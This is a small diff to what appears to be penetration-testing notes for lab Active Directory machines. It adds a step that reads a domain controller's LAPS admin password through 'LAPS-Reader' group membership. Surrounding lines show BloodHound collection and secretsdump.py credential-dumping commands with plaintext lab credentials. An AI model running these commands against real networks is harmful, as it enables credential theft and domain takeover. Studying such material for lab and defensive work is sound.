@@ -79,3 +79,8 @@ bloodhound-python -c ALL -u support -p '#00^BlackKnight' -d blackfield.local -dc
 ```
 secretsdump.py svc-alfresco:s3rvice@10.10.10.161
 ```
+#### User exploit with group
+```
+LAPS-Reader
+Get-ADComputer DC01 -property 'ms-mcs-admpwd'
+```
